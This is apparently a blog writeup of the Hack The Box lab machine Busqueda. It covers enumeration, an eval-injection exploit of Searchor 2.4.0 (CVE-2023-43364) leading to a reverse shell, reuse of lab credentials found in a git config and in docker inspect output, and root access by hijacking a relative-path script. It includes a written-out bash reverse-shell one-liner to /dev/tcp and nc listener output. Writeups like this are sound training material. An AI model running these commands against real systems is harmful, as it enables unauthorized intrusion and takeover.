---
layout: posts
title: "HTB — Busqueda Writeup"
date: 2026-03-09
tags: [htb, writeup, busqueda, web]
categories: [ctf]
---

## Overview

- **Machine:** Busqueda
- **Platform:** Hack The Box
- **OS:** Linux
- **Difficulty:** Easy

Busqueda is an easy Linux machine that emphasizes vulnerability research, enumeration, and source code analysis. It provides a good opportunity to practice internal service discovery and reviewing scripts to uncover exploitable logic flaws.

---

## Initial Enumeration

### Nmap scan

```bash
┌──(kali㉿kali)-[~/hackthebox/recap/busqueda]
└─$ sudo nmap -p- -sVC 10.129.228.217
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-09 07:39 EDT
Nmap scan report for 10.129.228.217
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap scan reveals a very simple machine with only two ports open. I ran an UDP scan, but it didn't reveal anything else. I'll proceed to add the virtual host to my /etc/hosts and start enumerating port 80.

### Port 80

<p align="center">
  <a href="/assets/images/busqueda/Captura1.png" class="glightbox">
    <img src="/assets/images/busqueda/Captura1.png" width="700">
  </a>
</p>

At plain view, we can see it's a custom web application. As the name states, it's functionality is mainly to search for a query in different search engines.

<p align="center">
  <a href="/assets/images/busqueda/Captura2.png" class="glightbox">
    <img src="/assets/images/busqueda/Captura2.png" width="700">
  </a>
</p>

Scrolling down a little bit in the footer, we can see this web app is built with `Flask`, which is a python web framework and `Searchor 2.4.0`, a python library to perform web scraping. A quick research on google reveals that this version of Searchor is vulnerable to [CVE-2023-43364](https://github.com/advisories/GHSA-66m2-493m-crh2).

<p align="center">
  <a href="/assets/images/busqueda/Captura3.png" class="glightbox">
    <img src="/assets/images/busqueda/Captura3.png" width="700">
  </a>
</p>

## Initial Foothold

### CVE-2023-43364

Although many working PoCs are publicly available, I’ll perform the exploit manually. Since the vulnerability is quite straightforward, reproducing it step by step helps understand what is happening behind the scenes rather than simply running a script.

### Shell as svc

Searching around, will lead us to the [commit](https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b) where this vulnerability was fixed.

The flaw exists in main.py, we can clone the repository to look for the vulnerability manually.

```bash
┌──(kali㉿kali)-[~/hackthebox/recap/busqueda]
└─$ git clone https://github.com/ArjunSharda/Searchor.git

Cloning into 'Searchor'...
remote: Enumerating objects: 1987, done.
remote: Counting objects: 100% (192/192), done.
remote: Compressing objects: 100% (132/132), done.
remote: Total 1987 (delta 126), reused 59 (delta 59), pack-reused 1795 (from 3)
Receiving objects: 100% (1987/1987), 765.52 KiB | 4.18 MiB/s, done.
Resolving deltas: 100% (919/919), done.
```

We'll go inside `/Searchor` and prompt for the commit `29d5b1f`, which is the one that fixed the vulnerability.

```bash
┌──(kali㉿kali)-[~/hackthebox/recap/busqueda/Searchor]
└─$ git show 29d5b1f
commit 29d5b1f28d29d6a282a5e860d456fab2df24a16b
Author: Dan Pavlov <dan.pavlov@unity3d.com>
Date:   Thu Oct 27 14:22:33 2022 +0100

    removed eval from search cli method

diff --git a/src/searchor/main.py b/src/searchor/main.py
index 9a35010..6e61e78 100644
--- a/src/searchor/main.py
+++ b/src/searchor/main.py

@@ -29,9 +29,7 @@ def cli():
 @click.argument("query")
 def search(engine, query, open, copy):
     try:
-        url = eval(
-            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
-        )
+        url = Engine[engine].search(query, copy_url=copy, open_web=open)^M
         click.echo(url)
         searchor.history.update(engine, query, url)
         if open:
```

As we can see, the eval() was removed completely.

```python
url = eval(
    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)
```

Since eval() executes arbitrary Python code, any unsanitized user input could lead to code execution. The patch replaced the dynamic execution with a direct function call:

```python
url = Engine[engine].search(query, copy_url=copy, open_web=open)
```

The vulnerability originates from the use of `eval()` to dynamically construct a Python expression. The user-controlled `query` parameter is inserted inside quotes within the evaluated string. By breaking out of the string, an attacker can inject arbitrary Python code, leading to remote code execution.

Inspecting with burpsuite, it's now clear where we should input the command execution.

<p align="center">
  <a href="/assets/images/busqueda/Captura4.png" class="glightbox">
    <img src="/assets/images/busqueda/Captura4.png" width="700">
  </a>
</p>

If we look at the code carefully, the syntax we're going to need:

- `'` to close the original query string
- `,` to inject a new function argument
- `))` to close the injected call and the original function call
- `#` to comment out the remaining arguments to avoid syntax errors

Finally, because this is a python interpreter using eval(), we'll need to invoke os, this is easily done with `__import__('os').popen('bash command')` or `__import__('os').system('bash command')`.

One interesting resource to look at is this [post](https://snyk.io/blog/command-injection-python-prevention-examples/), which explains the difference between several command injection in python.

Our final payload will look like this:

<p align="center">
  <a href="/assets/images/busqueda/Captura6.png" class="glightbox">
    <img src="/assets/images/busqueda/Captura6.png" width="700">
  </a>
</p>

I received the ping, so we can proceed to get a shell

```bash
┌──(kali㉿kali)-[~/hackthebox/recap/busqueda/Searchor]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:47:44.629481 IP searcher.htb > 10.10.16.3: ICMP echo request, id 1, seq 1, length 64
13:47:44.630920 IP 10.10.16.3 > searcher.htb: ICMP echo reply, id 1, seq 1, length 64
13:47:45.629411 IP searcher.htb > 10.10.16.3: ICMP echo request, id 1, seq 2, length 64
13:47:45.629444 IP 10.10.16.3 > searcher.htb: ICMP echo reply, id 1, seq 2, length 64
```

I'll use the busybox payload, as it is very realiable in HTB's machines, we just have to URL encode the spaces.

<p align="center">
  <a href="/assets/images/busqueda/Captura7.png" class="glightbox">
    <img src="/assets/images/busqueda/Captura7.png" width="700">
  </a>
</p>

```bash
┌──(kali㉿kali)-[~/hackthebox/recap/busqueda/Searchor]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.3] from (UNKNOWN) [10.129.2.22] 57630
whoami
svc
```

I'll invoke a full tty and proceed with enumeration.

## Privilege escalation

### Gitea credentials

Reviewing the directory home of the application, we can see it has a .git directory.

```bash
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Mar  9 17:43 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates

svc@busqueda:/var/www/app$ git show
fatal: detected dubious ownership in repository at '/var/www/app'
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/app
<t config --global --add safe.directory /var/www/app
svc@busqueda:/var/www/app$ git show
WARNING: terminal is not fully functional
Press RETURN to continue 
commit 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 (HEAD -> main, origin/main)
Author: administrator <administrator@gitea.searcher.htb>
Date:   Sun Dec 25 12:14:21 2022 +0000

    Initial commit

diff --git a/app.py b/app.py
new file mode 100644
index 0000000..4e76fdc
--- /dev/null
+++ b/app.py
@@ -0,0 +1,36 @@
+from flask import Flask, render_template, request, redirect
+from searchor import Engine
+import subprocess
+
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template('index.html', options=Engine.__members__, error='')
+
svc@busqueda:/var/www/app$ 
```

I'll leave here this very useful [resource](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html) from hacktricks to perform basic enumeration of .git directories.

Listing the git configuration reveals some credentials.

```bash
svc@busqueda:/var/www/app$ git config -l
WARNING: terminal is not fully functional
Press RETURN to continue 
user.email=cody@searcher.htb
user.name=cody
core.hookspath=no-hooks
safe.directory=/var/www/app
core.repositoryformatversion=0
core.filemode=true
core.bare=false
core.logallrefupdates=true
remote.origin.url=http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Search
er_site.git
remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*
branch.main.remote=origin
branch.main.merge=refs/heads/main
```

And it also reveals a gitea server running on the host too. We could also discover this fuzzing for virtual hosts.

```bash
┌──(kali㉿kali)-[~/hackthebox/recap/busqueda/Searchor]
└─$ ffuf -u http://searcher.htb -H "Host: FUZZ.searcher.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://searcher.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt
 :: Header           : Host: FUZZ.searcher.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

gitea                   [Status: 200, Size: 13237, Words: 1009, Lines: 268, Duration: 49ms]
```

I'll add this to my /etc/hosts.

The credentials work for the gitea server and we login as cody.

<p align="center">
  <a href="/assets/images/busqueda/Captura8.png" class="glightbox">
    <img src="/assets/images/busqueda/Captura8.png" width="700">
  </a>
</p>

Inside the gitea of cody we can see there's only one repository containing the website in port 80 with no interesting commits in history.

I also checked with our current user `svc` if the password was the same as cody, and it is. We can now run sudo.

```bash
svc@busqueda:/opt/scripts$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

I'll login with ssh and enumerate the command we can run as sudo.

### system-chekup.py

Looks like a custom python code to run a list of commands on the system, mainly related to docker.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Using the option `docker-ps` reveals a couple of docker containers that exist on the machine. One for gitea and the other belongs to a sql database.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 years ago   Up 59 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 59 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

To know how to use the proper syntax for docker-inspect, we can visit the docker [manual](https://docs.docker.com/reference/cli/docker/inspect/), I'll use the last one listed `"{{json .Config}}"`

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea
{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
```

This reveals some credentials, which belong to a database but I'll try them with the other account showed in the gitea server first which is Administrator.

<p align="center">
  <a href="/assets/images/busqueda/Captura9.png" class="glightbox">
    <img src="/assets/images/busqueda/Captura9.png" width="700">
  </a>
</p>

It works and we can login in Administrator. I can also see there's another repository that is private named scripts.

<p align="center">
  <a href="/assets/images/busqueda/Captura10.png" class="glightbox">
    <img src="/assets/images/busqueda/Captura10.png" width="700">
  </a>
</p>

Reviewing the codes, it shares similarities with the command we can run as sudo with svc. The one that is particularly interesting is `system-checkup.py`.

### System-checkup.py

```python
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```

This one looks like it's the script we can run as sudo, as it also contains functions for the docker commands, `inspect` and `ps`. It also contains the action of `full-checkup`. Trying this action on it's own will just give us an error message.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

Now that we have the source code we can now why is it failing.

```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

The script executes full-checkup.sh using a relative path. Since we can run it with sudo privileges, an attacker can place a malicious full-checkup.sh in the current directory, causing the script to execute the fake script as root and gain a privileged shell.

We'll simply create the fake script in the same terminal as svc using a one-liner and modify it's permissions so everyone can execute it.

```bash
svc@busqueda:~$ printf '#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.16.3/9001 0>&1\n' > full-checkup.sh && chmod +x full-checkup.sh

svc@busqueda:~$ ls -la
total 40
drwxr-x--- 4 svc  svc  4096 Mar 10 16:29 .
drwxr-xr-x 3 root root 4096 Dec 22  2022 ..
lrwxrwxrwx 1 root root    9 Feb 20  2023 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28  2023 .cache
-rwxrwxr-x 1 svc  svc    58 Mar 10 16:29 full-checkup.sh
-rw-rw-r-- 1 svc  svc    76 Apr  3  2023 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3  2023 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20  2023 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 Mar 10 16:08 user.txt
```

Next, I'll just run system-checkup with the option of full-checkup in the directory where I have the fake script.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

```

I receive the shell in our listener as root.

```bash
┌──(kali㉿kali)-[~/hackthebox/recap/busqueda]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.3] from (UNKNOWN) [10.129.228.217] 43590
root@busqueda:/home/svc# whoami
whoami
root

root@busqueda:/home/svc# cd ~
cd ~

root@busqueda:~# ls -la
ls -la
total 60
drwx------  9 root root 4096 Mar 10 16:08 .
drwxr-xr-x 19 root root 4096 Mar  1  2023 ..
lrwxrwxrwx  1 root root    9 Feb 20  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  3 root root 4096 Mar  1  2023 .cache
drwx------  3 root root 4096 Mar  1  2023 .config
-rw-r-----  1 root root  430 Apr  3  2023 ecosystem.config.js
-rw-r--r--  1 root root  104 Apr  3  2023 .gitconfig
drwxr-xr-x  3 root root 4096 Mar  1  2023 .local
-rw-------  1 root root   50 Feb 20  2023 .my.cnf
lrwxrwxrwx  1 root root    9 Feb 20  2023 .mysql_history -> /dev/null
drwxr-xr-x  4 root root 4096 Mar  1  2023 .npm
drwxr-xr-x  5 root root 4096 Mar 10 16:07 .pm2
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Mar 10 16:08 root.txt
drwxr-xr-x  4 root root 4096 Apr  3  2023 scripts
drwx------  3 root root 4096 Mar  1  2023 snap
```


